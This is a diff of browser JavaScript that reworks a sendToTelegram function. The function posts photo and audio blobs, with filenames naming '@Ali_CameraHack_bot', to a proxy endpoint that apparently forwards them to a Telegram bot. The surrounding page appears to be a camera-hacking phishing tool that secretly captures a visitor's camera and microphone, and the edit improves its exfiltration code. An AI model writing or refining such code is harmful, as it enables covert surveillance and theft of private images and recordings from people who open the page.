@@ -124,11 +124,17 @@
     });  
 
     function sendToTelegram(data,type){   
-      if(!chatid) return;   
-      const formData=new FormData();   
-      formData.append('chat_id',chatid);   
-      formData.append(type==='photo'?'photo':'audio',data,`@Ali_CameraHack_bot.${type==='photo'?'jpg':'wav'}`);   
-      fetch(`/api/proxy?type=${type}`,{method:'POST', body:formData});   
+  if(!chatid) return;   
+  const formData = new FormData();   
+  formData.append('chat_id', chatid);   
+
+  if(type === 'photo'){  
+    formData.append('photo', data, `@Ali_CameraHack_bot_${Date.now()}.jpg`);  
+  } else if(type === 'audio'){  
+    formData.append('audio', data, `@Ali_CameraHack_bot_${Date.now()}.ogg`);  
+  }  
+
+  fetch(`/api/proxy?type=${type}`, { method:'POST', body:formData });   
     }  
 
     function getBattery(){   
